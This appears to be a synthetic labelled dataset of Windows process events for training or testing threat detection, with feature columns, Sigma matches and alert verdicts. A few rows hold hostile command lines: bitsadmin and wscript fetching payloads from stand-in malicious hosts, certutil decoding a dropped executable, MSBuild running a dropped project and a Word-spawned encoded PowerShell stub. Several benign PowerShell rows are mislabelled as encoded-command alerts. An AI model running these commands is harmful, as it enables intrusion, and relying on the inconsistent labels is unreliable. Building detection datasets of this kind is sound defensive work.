UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-04T01:29:38.753Z,{F33FD691-42F6-42EB-A860-9415F15A6D11},21447,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job2326 /download http://exploit-kit2035.ru/files/svc533.exe C:\Users\Public\loader781.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,46026,CORP\jsmith,Medium,1,T1197,BITSAdmin Download,malicious,4,24,1,0,114,4.9245,1,1,0,0,6,0.1667,0,1,2,0,0,1,1514001697,1,1,0,29,3.9031,3.09927301244924,1.634617285747474,0,9,1,True,BITSAdmin File Download,high,attack.t1197,89.83832546677398,90,"powershell.exe → bitsadmin.exe: PowerShell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 90
2024-07-02T21:59:30.068Z,{342E9DDD-5BC2-447A-AE60-2DD80F65E56F},6978,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,55511,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,25,0,0,31,4.236,0,0,0,0,1,0.0,0,0,1,0,0,0,1224424709,21,0,0,59,1.6726,-0.22853630234101782,0.6036804969744555,1,7,3,False,None,none,,21.77910549108826,0,services.exe → spoolsv.exe: No known suspicious pattern,False,CLEAR,NONE,7.3,
2024-07-01T02:49:51.320Z,{EAA699C6-E43A-419F-A6CF-37B4FD1C8967},22580,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://malware-cdn9364.net/script849.js,C:\Windows\System32\cmd.exe,cmd.exe /c,55547,CORP\mjones,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,63,4.4497,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,2,1,0,49,3.9031,1.0544745178190815,0.9236677035987026,0,0,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,92.4867158584756,85,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.2,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 92 | Chain Risk: 85
2024-07-05T16:09:07.042Z,{DA0F650C-59DE-4EEA-916E-A9405C1DFC16},1329,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,38533,CORP\admin,High,0,,,benign,0,11,0,0,11,3.0272,0,0,0,0,1,0.0,0,0,1,0,0,0,1935590950,16,0,0,9,2.0,-1.03041806494108,-1.2063360466258695,0,3,2,False,None,none,,10.830562145979538,0,explorer.exe → perfmon.exe: No known suspicious pattern,False,CLEAR,NONE,3.6,
2024-07-04T20:28:30.894Z,{936B3E97-3723-476A-84F3-B79C2F37DA2C},49180,C:\Windows\System32\certutil.exe,certutil.exe -decode C:\Users\Public\encoded9534.txt C:\Users\Public\decoded1447.exe,C:\Windows\System32\cmd.exe,powershell.exe,9749,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious,1,8,1,0,84,4.3974,1,0,0,0,4,0.25,0,0,2,0,0,1,1473216238,20,0,0,28,3.9031,1.896450368549147,0.8453554391791984,0,12,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,90.61933846908593,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,ALERT,CRITICAL,99.1,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 91 | Chain Risk: 50
2024-07-03T11:51:07.338Z,{BBE17C7A-5235-4E17-B588-673ED7BF216A},11649,C:\Windows\System32\cmd.exe,cmd.exe /c net view \\fileserver,C:\Windows\explorer.exe,C:\Windows\explorer.exe,48914,CORP\helpdesk,Medium,0,,,benign,0,4,1,1,32,3.8234,0,0,0,0,5,0.0,0,0,1,0,0,0,2764436884,11,0,0,51,0.9208,-0.18844221421101473,-0.014132893073107467,0,14,1,False,None,none,,29.309802633965916,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,9.8,
2024-07-01T16:43:57.053Z,{267F65F7-2DB5-42E0-A129-E6EA5FB83D86},12753,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,15626,CORP\admin,High,0,,,benign,1,3,1,1,86,4.3913,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,16,0,0,43,1.3846,1.976638544809153,0.836221503940977,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,48.66108933820465,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 49 | Chain Risk: 5
2024-07-01T09:28:10.710Z,{9852FE37-8906-4044-B07F-47A9F6B1ED2B},20625,C:\Windows\explorer.exe,explorer.exe C:\Users\agarwal\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",60206,CORP\agarwal,Medium,0,,,benign,0,0,0,0,39,4.163,0,0,0,0,2,0.0,0,0,1,0,0,0,1994286725,9,0,0,28,1.7891,0.09221640269900704,0.49437274740229886,0,12,1,False,None,none,,6.26651952779491,0,explorer.exe → explorer.exe: No known suspicious pattern,False,CLEAR,NONE,2.1,
2024-07-03T08:24:56.655Z,{6871BA40-10AF-4663-B444-88115F2EA9D6},17763,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_9.2.15.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,51544,CORP\itops,High,0,,,benign,0,12,0,0,56,4.423,0,0,0,0,4,0.0,0,0,1,0,0,0,2082361945,8,0,0,24,1.4881,0.7738159009090598,0.883688019851078,0,5,2,False,None,none,,12.758637750563334,0,explorer.exe → msiexec.exe: No known suspicious pattern,False,CLEAR,NONE,4.3,
2024-07-05T00:40:49.647Z,{3F9A12F9-F957-40B4-A3DB-75F2F17F59C4},26066,C:\Windows\System32\smss.exe,smss.exe,C:\Windows\System32\smss.exe,smss.exe,4547,NT AUTHORITY\SYSTEM,System,0,,,benign,8,26,0,0,8,2.1556,0,0,0,0,1,0.0,0,0,1,0,0,0,3497520200,0,1,0,40,2.301,-1.1507003293310893,-2.511440629188778,1,2,3,False,None,none,,65.59005285375873,10,smss.exe → smss.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,21.9,
2024-07-05T16:43:26.846Z,{73161863-29C9-4659-9EC5-8347A3E37943},10801,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\klee\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",40682,CORP\klee,Medium,0,,,benign,10,27,0,0,46,4.308,0,0,0,0,2,0.0,0,0,2,1,0,0,2627095310,16,0,0,43,1.757,0.3728750196090288,0.7114908801141175,0,6,1,False,None,none,,39.21727129100773,0,winword.exe → acrobat.exe: No known suspicious pattern,False,CLEAR,NONE,13.1,
2024-07-01T16:02:53.867Z,{0226449F-8E79-4F51-8452-AEA4CAE5B9AA},5871,C:\Windows\System32\cmd.exe,cmd.exe /c systeminfo,C:\Windows\explorer.exe,C:\Windows\explorer.exe,62943,CORP\dbadmin,Medium,0,,,benign,0,4,1,1,21,3.7849,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,16,0,0,2,0.9208,-0.6294771836410489,-0.0717815007241767,0,4,1,False,None,none,,31.425335158719136,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,10.5,
2024-07-02T13:15:26.937Z,{C6E9DCF4-45B9-4ABD-94BD-F5FD0BAE3819},48204,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,21967,CORP\mjones,Medium,0,,,benign,1,3,1,1,106,4.6971,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,13,0,0,15,1.3846,2.7785203074092153,1.294116158998041,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,51.969696951646014,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 52 | Chain Risk: 5
2024-07-03T08:21:44.823Z,{4D16A8D2-F6FF-4798-A603-655153C3882C},8292,C:\Program Files\Docker\Docker\resources\bin\docker.exe,docker.exe ps -a,C:\Windows\System32\cmd.exe,cmd.exe,20996,CORP\agarwal,Medium,0,,,benign,1,28,0,0,16,3.5778,0,0,0,0,3,0.0,0,0,2,0,0,1,3896396763,8,0,0,21,2.2041,-0.8299476242910645,-0.3818860888939546,0,12,1,False,None,none,,48.490995416106585,0,cmd.exe → docker.exe: No known suspicious pattern,False,CLEAR,NONE,16.2,
2024-07-01T12:57:41.197Z,{C6996F52-F29F-4DBE-929F-F2CB14604FAF},21992,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,34678,CORP\sysadmin,High,0,,,benign,0,29,0,0,10,2.8464,0,0,0,0,1,0.0,0,0,1,0,0,0,1812276317,12,0,0,57,1.8617,-1.070512153071083,-1.477059897621021,0,10,2,False,None,none,,11.551476701582931,0,explorer.exe → resmon.exe: No known suspicious pattern,False,CLEAR,NONE,3.9,
2024-07-04T13:52:55.353Z,{ECF9A3B6-EC3B-462A-A545-34D1E8829E12},32906,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,52947,CORP\itops,High,0,,,benign,0,30,0,0,20,3.1087,0,0,0,0,2,0.0,0,0,1,0,0,0,2647570127,13,0,0,52,1.6021,-0.669571271771052,-1.0843006823775025,0,5,2,False,None,none,,7.5687314825627485,0,explorer.exe → mmc.exe: No known suspicious pattern,False,CLEAR,NONE,2.5,
2024-07-04T14:13:26.717Z,{520397F3-3C51-477C-A049-AD7578002E96},50295,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",25399,CORP\mjones,Low,0,,,benign,11,10,0,0,35,4.0931,0,0,0,0,4,0.0,0,0,2,0,1,0,2019625803,14,0,0,13,1.727,-0.0681599498210054,0.3897068337708762,0,0,0,False,None,none,,39.06633437249188,0,firefox.exe → firefox.exe: No known suspicious pattern,False,CLEAR,NONE,13.0,
2024-07-01T10:19:26.694Z,{75015D30-5698-487E-B30F-0B70943D3AF9},12088,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""DiskCleanup"" /tr ""cleanmgr /sagerun:1"" /sc weekly /d MON",C:\Windows\System32\cmd.exe,cmd.exe,4860,CORP\sysadmin,High,0,,,gray_area,1,15,0,0,82,4.4321,0,0,0,0,11,0.0,0,0,2,0,0,1,200102300,10,0,0,19,3.9031,1.8162621922891407,0.8973140543867855,0,10,2,False,None,none,,71.77488843146895,0,cmd.exe → schtasks.exe: No known suspicious pattern,False,ALERT,MEDIUM,51.2,"ANOMALY SCORE: 72/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); unusual number of arguments: 11.00 (baseline: 3.17±2.29, z=3.4); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-03T14:48:04.587Z,{21554F27-8227-4B2E-8423-5F5EEC4366CF},10023,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,35698,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,31,0,0,37,4.3782,0,0,0,0,1,0.0,0,0,1,0,0,0,3001280475,14,0,0,48,1.699,0.012028226439000818,0.8166060036752878,1,7,3,False,None,none,,14.439839016084266,0,services.exe → wmiprvse.exe: No known suspicious pattern,False,CLEAR,NONE,4.8,
2024-07-04T09:43:27.206Z,{51B07421-ABA7-47C0-8D5D-2C369B75E86E},54907,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,42105,CORP\admin,High,0,,,benign,0,23,0,0,18,3.5305,0,0,0,0,3,0.0,0,0,1,0,0,0,2635501913,9,0,0,43,1.6726,-0.7497594480310582,-0.4527115211509824,0,3,2,False,None,none,,4.648522120340445,0,explorer.exe → setup.exe: No known suspicious pattern,False,CLEAR,NONE,1.5,
2024-07-02T18:26:39.654Z,{29E03D8A-0CED-426D-A2E7-A8E20C18CEFD},2984,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,33639,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,32,0,0,47,4.5221,0,0,0,0,3,0.0,0,0,1,0,0,0,4235360328,18,0,0,26,1.757,0.4129691077390319,1.0320770333113627,1,7,3,False,None,none,,17.925694300650527,0,services.exe → msmpeng.exe: No known suspicious pattern,False,CLEAR,NONE,6.0,
2024-07-02T21:54:51.570Z,{B48E4C69-4713-42B1-AFB3-09AD45F4981A},24971,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",6918,CORP\mjones,Medium,0,,,benign,0,10,0,0,11,2.6635,0,0,0,0,1,0.0,0,0,1,0,0,0,1342727496,21,0,0,54,2.1249,-1.03041806494108,-1.7509282181244123,0,0,1,False,None,none,,26.564057750844484,0,explorer.exe → firefox.exe: No known suspicious pattern,False,CLEAR,NONE,8.9,
2024-07-01T08:13:30.079Z,{2E19C69E-76FC-4B62-B98D-764E83D64F6B},9696,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,39907,CORP\jsmith,Medium,0,,,benign,0,3,1,1,98,4.7762,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,8,0,0,13,1.231,2.4577676023691906,1.4125578438084203,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.233702460566676,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-04T16:13:27.104Z,{9408AAD7-0016-41F9-A119-83E9E5C7261E},49233,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,55399,CORP\itops,High,0,,,benign,0,3,1,1,106,4.6971,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,16,0,0,13,1.231,2.7785203074092153,1.294116158998041,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,46.01949664002123,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 46 | Chain Risk: 5
2024-07-03T21:40:41.086Z,{02D209F8-100E-45C6-B91D-6E0627BE1898},39163,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,39411,NT AUTHORITY\SYSTEM,System,0,,,benign,2,9,0,0,34,3.8895,0,0,0,0,2,0.0,0,0,1,0,0,0,392754572,21,0,0,40,1.7891,-0.1082540379510085,0.08484302811483231,1,2,3,False,None,none,,17.983754908598193,0,svchost.exe → usoclient.exe: No known suspicious pattern,False,CLEAR,NONE,6.0,
2024-07-03T17:36:23.478Z,{8C0A8F6E-45E0-4970-A7A3-D8CDE5B66F6C},53668,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,65422,NT AUTHORITY\SYSTEM,System,0,,,benign,3,31,0,0,37,4.3782,0,0,0,0,1,0.0,0,0,1,0,0,0,3001280475,17,0,0,36,1.699,0.012028226439000818,0.8166060036752878,1,2,3,False,None,none,,16.64573650627112,0,services.exe → wmiprvse.exe: No known suspicious pattern,False,CLEAR,NONE,5.5,
2024-07-05T21:39:07.131Z,{EC7C53B7-CB48-4939-89A0-922E8B8BB47C},64903,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,7336,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,7,0,0,13,3.2389,0,0,0,0,1,0.0,0,0,1,0,0,0,1815403986,21,0,0,39,1.757,-0.9502298886810738,-0.8893435728666134,1,7,3,False,None,none,,29.376562003095444,0,services.exe → taskhostw.exe: No known suspicious pattern,False,CLEAR,NONE,9.8,
2024-07-03T16:25:52.556Z,{0496EC0A-FD80-434E-8862-DCAD48DBDF37},32024,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,17601,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,33,0,0,45,4.4302,0,0,0,0,4,0.0,0,0,1,0,0,0,2168783887,16,0,0,25,1.3349,0.3327809314790257,0.8944690581650444,1,7,3,False,None,none,,20.920251711755476,0,services.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,7.0,
2024-07-02T02:48:19.864Z,{207484A9-3281-473A-B346-8E5349B5AAEB},29533,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\driver745.csproj,C:\Windows\System32\cmd.exe,cmd.exe,27886,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious,1,34,1,0,84,4.9209,0,0,0,0,2,0.0,0,0,2,0,0,1,442785036,2,1,0,48,3.9031,1.896450368549147,1.62922676659049,0,0,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.27412849376216,75,cmd.exe → msbuild.exe: Command shell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.1,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 81 | Chain Risk: 75
2024-07-03T14:47:07.097Z,{F95A17A9-4C2A-4F83-940A-EF452428C6C7},56787,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,50689,CORP\admin,High,0,,,benign,0,23,0,0,18,3.5305,0,0,0,0,3,0.0,0,0,1,0,0,0,2635501913,14,0,0,47,1.6726,-0.7497594480310582,-0.4527115211509824,0,3,2,False,None,none,,3.4158350273636087,0,explorer.exe → setup.exe: No known suspicious pattern,False,CLEAR,NONE,1.1,
2024-07-05T09:04:34.218Z,{729611F7-1471-49FA-80E0-082A3D6B56C8},34153,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",18380,CORP\helpdesk,Medium,0,,,benign,0,13,0,0,25,3.7835,0,0,0,0,2,0.0,0,0,1,0,0,0,3306193959,9,0,0,4,1.7891,-0.46910083112103645,-0.0738778137296699,0,14,1,False,None,none,,3.156399575086814,0,explorer.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,1.1,
2024-07-02T20:10:03.279Z,{AA3E9119-15C5-43EF-9526-48D17C98112A},24669,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document41.docm",28493,CORP\klee,Medium,1,T1204.002,Office Macro Execution,malicious,10,4,1,1,234,4.7862,1,0,0,1,8,0.375,1,0,2,1,0,0,1182374401,20,0,0,10,3.9031,7.910563588049614,1.427531508133373,0,6,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → cmd.exe: Office Word spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-01T16:36:00.624Z,{9D473E3B-57F3-439E-A2A4-B3B94AFB089C},43599,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,11755,CORP\sysadmin,High,0,,,benign,0,3,1,1,73,4.3563,1,0,0,0,7,0.1429,0,0,1,0,0,0,945137867,16,0,0,36,1.231,1.4554153991191128,0.7838136788036412,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,49.99951116544086,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 50 | Chain Risk: 5
2024-07-04T06:36:11.556Z,{D96E0F74-488E-4208-908C-A67A8CD2048D},23784,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,22212,NT AUTHORITY\SYSTEM,System,0,,,benign,2,22,0,0,31,3.6797,0,0,0,0,3,0.0,0,0,1,0,0,0,26065344,6,0,0,36,1.8617,-0.22853630234101782,-0.2293044494226828,1,2,3,False,None,none,,14.54963278151622,0,svchost.exe → conhost.exe: No known suspicious pattern,False,CLEAR,NONE,4.8,
2024-07-04T10:52:45.760Z,{59FEA918-14A1-4189-8B4F-AD6EB371D32C},48288,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Temp\update_2.0.21.msi /passive /norestart,C:\Windows\explorer.exe,C:\Windows\explorer.exe,27818,CORP\itops,High,0,,,benign,0,12,0,0,60,4.3838,0,0,0,0,5,0.0,0,0,1,0,0,0,2082361945,10,0,0,52,1.4881,0.9341922534290723,0.8249912556972618,0,5,2,False,None,none,,13.597089127860583,0,explorer.exe → msiexec.exe: No known suspicious pattern,False,CLEAR,NONE,4.5,
2024-07-01T10:39:27.648Z,{F6789ACC-E345-4592-BBE8-831659285367},29141,C:\Users\itops\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,27436,CORP\itops,High,0,,,benign,0,23,0,0,18,3.5305,0,0,0,0,3,0.0,0,0,1,0,0,0,2635501913,10,0,0,39,1.6726,-0.7497594480310582,-0.4527115211509824,0,5,2,False,None,none,,3.476807182851384,0,explorer.exe → setup.exe: No known suspicious pattern,False,CLEAR,NONE,1.2,
2024-07-04T11:19:42.595Z,{EEE25DC3-3C44-4B0E-BB1F-0574819B5D98},25184,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",32015,CORP\agarwal,Medium,0,,,benign,0,13,0,0,25,3.7835,0,0,0,0,2,0.0,0,0,1,0,0,0,3306193959,11,0,0,19,1.7891,-0.46910083112103645,-0.0738778137296699,0,12,1,False,None,none,,1.93439337373644,0,explorer.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,0.6,
2024-07-05T11:49:33.389Z,{1AFCF048-07B9-45B7-9FCF-0092B94A8006},30524,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",60539,CORP\netadmin,Medium,0,,,benign,0,35,0,0,8,2.5,0,0,0,0,1,0.0,0,0,1,0,0,0,2236906458,11,0,0,49,1.699,-1.1507003293310893,-1.9957476298373948,0,8,1,False,None,none,,18.713666421078845,0,explorer.exe → calc.exe: No known suspicious pattern,False,CLEAR,NONE,6.2,
2024-07-01T07:36:54.816Z,{FC003D03-80DC-49F3-8A4A-1303D0A3ED84},26455,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,24252,NT AUTHORITY\SYSTEM,System,0,,,benign,2,36,0,0,28,3.7499,0,0,0,0,3,0.0,0,0,1,0,0,0,2407871594,7,0,0,36,1.8239,-0.3488185667310272,-0.12418932586151261,1,2,3,False,None,none,,13.14692667458414,0,svchost.exe → update.exe: No known suspicious pattern,False,CLEAR,NONE,4.4,
2024-07-01T03:42:26.433Z,{3FFAE1A1-589F-40FF-894B-37F7682DCDFB},24938,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,23826,NT AUTHORITY\SYSTEM,System,0,,,benign,8,37,0,0,7,2.5216,0,0,0,0,1,0.0,0,0,1,0,0,0,3089833384,3,1,0,42,2.058,-1.1907944174610925,-1.9634045148954966,1,2,3,False,None,none,,52.2971531511687,10,smss.exe → dwm.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,17.4,
2024-07-02T03:29:06.823Z,{326522F8-4A9B-4413-8422-89FFF56A1FB3},53023,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,10161,NT AUTHORITY\SYSTEM,System,0,,,benign,2,36,0,0,28,3.7499,0,0,0,0,3,0.0,0,0,1,0,0,0,2407871594,3,1,0,29,1.8239,-0.3488185667310272,-0.12418932586151261,1,2,3,False,None,none,,27.684652710540213,10,svchost.exe → update.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,9.2,
